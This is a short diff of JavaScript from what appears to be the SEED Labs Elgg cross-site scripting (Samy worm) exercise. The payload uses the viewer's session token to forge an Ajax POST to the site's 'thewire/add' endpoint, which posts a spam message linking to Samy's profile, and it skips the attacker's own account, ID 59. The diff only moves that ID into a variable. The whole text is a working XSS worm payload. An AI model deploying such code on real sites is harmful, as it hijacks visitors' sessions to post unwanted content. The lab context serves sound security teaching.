@@ -6,11 +6,11 @@
 		//Construct the HTTP request to add Samy as a friend.
 
 		var sendurl = "http://www.seed-server.com/action/thewire/add";
-      
+        var samy_id= 59;
 
         var content = ts+token+ "&body=To earn 12 USD/Hour(!), visit now http://www.seed-server.com/profile/samy"  ;
 
-		if (elgg.session.user.guid != 59) {
+		if (elgg.session.user.guid != samy_id) {
 			//Create and send Ajax request to add friend
 			Ajax = new XMLHttpRequest();
 			Ajax.open("POST", sendurl, true);
